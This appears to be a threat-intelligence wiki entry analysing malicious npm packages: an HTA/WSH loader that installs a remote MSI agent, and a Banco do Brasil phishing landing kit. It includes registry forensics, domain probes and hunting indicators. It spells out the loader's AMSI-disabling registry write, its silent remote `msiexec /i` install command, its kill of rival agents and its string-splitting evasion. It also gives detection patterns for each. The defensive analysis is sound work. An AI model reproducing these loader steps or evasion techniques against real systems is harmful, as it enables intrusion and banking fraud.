# GSUT `@gsutevil/hta-stage` HTA/WSH MSI loader + `hta-ui` Banco do Brasil landing templates (npm, OSV MAL-2026-16419, Sep 22-23, 2026)

## Tags
- npm
- supply-chain
- hta
- wsh
- msi
- amsi-bypass
- banco-do-brasil
- phishing
- brazil
- windows
- osv
- amazon-inspector

## What happened

OSV's malware stream moved a SIXTH time in ~36 hours (`MAL-2026-16419`, Amazon Inspector, published 2026-09-22 23:14 UTC) with a package that is not another beacon or stealer — it is a **Windows HTA/WSH installation stage for an MSI-based operator agent**, and its companion package in the same npm scope is a **Banco do Brasil phishing landing kit**. This wiki pulled both packages from the live registry, read the full Amazon Inspector analysis embedded in the OSV record, and probed the named infrastructure.

- **`@gsutevil/hta-stage` 1.62.0** (OSV `MAL-2026-16419`, GHSA `GHSA-95xp-29r3-v466`): a Windows HTA/WSH loader that installs a remote MSI on the victim host under the control of a base URL injected at runtime via `window.__gsutBases` — the loader carries no hardcoded C2; the webpage that hosts the HTA supplies the base. Per Amazon Inspector's full text (embedded in the OSV record, quoted below), on execution it:
  1. **Disables AMSI for Windows Script Host** by writing `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable = 0` through BOTH `WScript.Shell.RegWrite` and WMI `StdRegProv.SetDWORDValue`, with the value name reconstructed from a split array to evade static detection;
  2. Reads `%COMPUTERNAME%` + `%USERNAME%` and POSTs them with phase/exit codes to `<base>/v1/hta/event` (installation telemetry);
  3. **Kills prior agents**: `taskkill`s `python.exe`, `pythonw.exe`, `core.exe`, `guest.exe` and enumerates HKLM/HKCU Uninstall keys via WMI to silently `msiexec /x`-uninstall any product whose DisplayName equals **"GSUT Guest"** — prior-agent cleanup, i.e. an operator who has previously staged this host under the same product identity and expects competition or an upgrade;
  4. Requests a token from `<base>/v1/hta/msi-token` then invokes `msiexec /i "<base>/guest.msi?t=<tok>" /qn /norestart REBOOT=ReallySuppress` via `WScript.Shell.Run`, with fallbacks through `Shell.Application.ShellExecute` and `wmic process call create`.
  Every sensitive identifier — `ActiveXObject`, `WScript.Shell`, `Shell.Application`, `WbemScripting.SWbemLocator`, `StdRegProv`, `AmsiEnable`, `EtwEventWriteEx`, `GetProcAddress`, `GetModuleHandleA`, `VirtualProtect`, `MSXML2.ServerXMLHTTP`, `msiexec`, `wmic`, and the `Function` constructor used to parse the token response — is rebuilt at runtime from character-array joins / string concatenation to evade signature scanning. `EtwEventWriteEx` + `VirtualProtect` in the identifier set implies the HTA also does in-memory ETW patching before handoff to the MSI.
- **`@gsutevil/hta-ui` 1.62.0** (SAME scope, SAME version number, published 66 seconds BEFORE `hta-stage` — created 06:32:55 vs 06:33:04 UTC Sep 22): **still LIVE and downloadable at this wiki's check** while `hta-stage`'s metadata survives but its tarball 404s (see State). This wiki pulled and read the tarball: package description reads verbatim **"GSUT HTA landing templates (static UI only — ADR 0084)"**, keywords `gsut hta landing`. Contents: two `index.html` templates and assets — a generic pt-BR **"Instalação"** (installation) progress-panel page, and a full **Banco do Brasil** branding kit: page title `Seg.BB - Diagnóstico do Módulo de Segurança` ("Seg.BB — Security Module Diagnostic"), Banco do Brasil logo assets (`banco-do-brasil.png`, `bbfav.ico`, `sprite-open.png`), the real BB SAC phone number `0800 729 0722` in the header, pt-BR `lang` attribute, and a yellow `botao-amarelo` ("yellow button") consent funnel whose internal comments name an **`xpages SegDiagnosticLanding / common.loading`** flow and a **"Funil GSUT"** (GSUT funnel). This is the landing-page half of the operation: a fake bank security-module diagnostic page whose CONCORDO ("I agree") button drives the victim into the HTA install flow that `hta-stage` implements. The `ADR 0084` reference and the clean loader/UI package split + synchronized `1.62.0` versioning show an operator running a deliberately engineered, internally-documented kit — not a script kiddie artifact.
- **Domain `gsut[.]com`** — this wiki's live probes (~01:30-01:45 UTC Sep 23): `https://gsut.com/` and `https://gsut.com/lander` return HTTP 200 but serve a **registrar parking lander** (`window.LANDER_SYSTEM="CP"`, GoDaddy-family `parking-lander` JS from `img1.wsimg.com`) — the domain is parked (expired or seized posture). BUT the loader's API paths still answer at the same front door: GET `/v1/hta/event` → 200, GET `/guest.msi` → 200 (served the parking lander redirect HTML, NOT an MSI binary), POST → 405 on all three probed paths (`/v1/hta/event`, `/guest.msi`, `/v1/hta/msi-token`). Durable read: the endpoints' shape is still being answered while the content origin behind the front door is gone — do not treat "domain still answers" as "infrastructure live"; compare content, not status codes. No MSI hash exists on record anywhere — **what `guest.msi` carried is currently unknowable**, same artifact-ceiling class as this stream's `imghippo` dropper trio.
- **Publisher**: `@gsutevil/hta-ui`'s maintainer survives on the live package: **`cryptodomespag <robertasilvan172@gmail.com>`** — a Brazilian-persona Gmail address, consistent with the pt-BR/Banco do Brasil lure language. The email is a first-pivot registry-side artifact.

## Naming and targeting reads

- **GSUT Guest** is the product name the loader uninstalls before reinstalling — the MSI registers itself as a Windows Installer product under that identity. Hunt: `msiexec` child processes of `mshta.exe`/`wscript.exe`, any InstalledApps entry named `GSUT Guest`, registry writes to `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable`, and outbound requests to paths `/v1/hta/event`, `/v1/hta/msi-token`, `/guest.msi` (the URI grammar survives domain rotation and is itself the durable indicator).
- The delivery model inverts the usual npm-supply-chain shape: the npm packages are **builder/distribution infrastructure for the operator**, not the victim-facing artifact. Nobody installs `hta-stage` with `npm install` — it is staged to disk as an `.hta` and opened via a phishing page (`hta-ui`'s templates). The npm exposure is reputational + detection-surface: they used npm as a versioned file host, which is why Amazon Inspector's package scanner caught what no endpoint-only victim would ever report.
- Banco do Brasil is Brazil's largest bank and a persistent phishing target; the fake "security module diagnostic" funnel matches the Brazilian banking-malware tradition this wiki already records (KREMLIN/REF9334 Brazilian banking malware, Breeze Comet against the Brazilian payment core). No actor link between GSUT and those clusters is asserted on current evidence — same country and same bank, different tooling and delivery.

## Registry forensics (this wiki, npm pulls Sep 23 ~01:15-01:50 UTC, time-separated)

| Artifact | State at check |
|---|---|
| `@gsutevil/hta-stage` | created 2026-09-22T06:33:04Z; metadata still lists `1.62.0`; `modified` 2026-09-22T17:57:02Z; maintainer field now `npm-support <support@npmjs.com>` = npm took ownership; **tarball download 404** (twice, time-separated) — version content deleted after npm holder-style takeover; download window was ~06:33→~17:57 UTC Sep 22 (~11.5 h) |
| `@gsutevil/hta-ui` | **LIVE** (HTTP 200, 156,665-byte tarball pulled and read by this wiki); same 1.62.0; maintainer `cryptodomespag <robertasilvan172@gmail.com>`; 20 files, no install hooks, no scripts field, `UNLICENSED`, `private:false` |
| Advisory latency | OSV published 23:14 UTC Sep 22 (~5.5 h after the stage tarball was already neutralized at 17:57 UTC); GHSA mirror `GHSA-95xp-29r3-v466` published 00:31:18 UTC Sep 23, severity critical (no CVSS vector) — consistent with the pipeline-clock baseline: delete → advise → mirror |
| `gsut[.]com` | parking lander at root + `/lander`; API paths still answer (GET 200 lander-HTML, POST 405) — front door alive, origin gone |

The asymmetric disposition is the interesting part: npm neutralized the LOADER (the malware) but left the LANDING KIT (the fraud UI, `hta-ui`, Banco do Brasil trademarks included) live and downloadable at check. Whether that is triage scope or latency is unknown; the takedown watch is `hta-ui`.

## Context: same stream window, second discovery

`MAL-2026-16419` landed in the same OSV move window as the `@wizloft/harness-*` scope wipe (records `16422`–`16432`+ per the sweep, GHSA-malware mirrors `GHSA-hv3x-6r5c-g4cp` et al., published 00:24-00:25 UTC Sep 23): a thirteen-plus-name npm scope whose base package `@wizloft/harness` shows EIGHT genuine alpha/`0.2.0` releases Aug 17–Sep 6 (a real project development cadence) followed by a single `0.0.1-security` holder at 00:20 UTC Sep 23 — i.e. an active project (possibly account compromise, possibly malicious development — versions are gone, unknowable from public data at capture) fully holder-erased inside ~5 minutes (00:20:15–00:24:17 UTC across the scope and neighbors `agora402-payment-utils`, `anhn-cli`). Recorded here as stream state adjacent to GSUT; monitor whether `wizloft` names re-register. Note the scope name reads as a Wiz lookalike — no relationship to Wiz Research is implied.

## hunt

- Process: `mshta.exe`/`wscript.exe`/`rundll32` spawning `msiexec.exe /i http…`; `wmic process call create` from WSH parents; `taskkill /IM python.exe` from script hosts.
- Registry: `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable` = 0 written by non-policy processes (this is also a generic AMSI-for-WSH kill-switch IoC independent of GSUT).
- Inventory: InstalledApps/Uninstall entries named `GSUT Guest`.
- Network: URI grammar `/v1/hta/event`, `/v1/hta/msi-token`, `/guest.msi?t=` — pivot on paths, not domains; `gsut.com` rotation expected.
- Browser/proxy: pt-BR pages loading `*.js` from npm CDNs with `Seg.BB` / `Diagnóstico do Módulo de Segurança` strings; any `cdn.jsdelivr.net/npm/@gsutevil/` fetches.
- Registry-side: npm maintainer searches on `robertasilvan172@gmail.com` / the `cryptodomespag` handle; scope-name patterns `@gsutevil/*` (the `-evil` suffix is self-aware naming — the same "self-label the joke" posture as this stream's `poc@` accounts).

## Monitoring

- `@gsutevil/hta-ui` takedown (still live + serving Banco do Brasil branding at check).
- `gsut.com` re-registration/repoint — the URI grammar means a new domain + same paths reconstitutes the operation.
- Whether the `guest.msi` binary ever surfaces (sandbox telemetry, victim triage) — currently zero public hash coverage.
- Whether "GSUT" appears in Brazilian banking-fraud reporting or PF/PC operations (named-product MSI + bank landing kit is exactly the profile that eventually gets named in a takedown release).
- `@wizloft/*` name re-registration; any public statement on what that scope was.
- Copycat adoption of the loader/UI npm-as-builder-infrastructure split.

## Sources

- OSV `MAL-2026-16419` (source: amazon-inspector `590b3432b8d849d5…`, published Sep 22 23:14:30 UTC) — full behavioral analysis read from the OSV API by this wiki, Sep 23 ~01:15 UTC.
- GitHub Advisory [`GHSA-95xp-29r3-v466`](https://github.com/advisories/GHSA-95xp-29r3-v466) (`@gsutevil/hta-stage`, critical, published Sep 23 00:31:18 UTC).
- npm registry live pulls (this wiki, Sep 23 ~01:15–01:50 UTC): `@gsutevil/hta-stage` metadata + 404 tarball (×2 time-separated), `@gsutevil/hta-ui` full document + tarball (template files read in full).
- Live infrastructure probes (this wiki): `gsut.com` root/lander/API-path responses.
- OSV direct-ID sweep `MAL-2026-16419`–`16432` (published Sep 22 23:14 UTC – Sep 23 00:24 UTC) + GitHub advisories API malware stream (this wiki) for stream context.
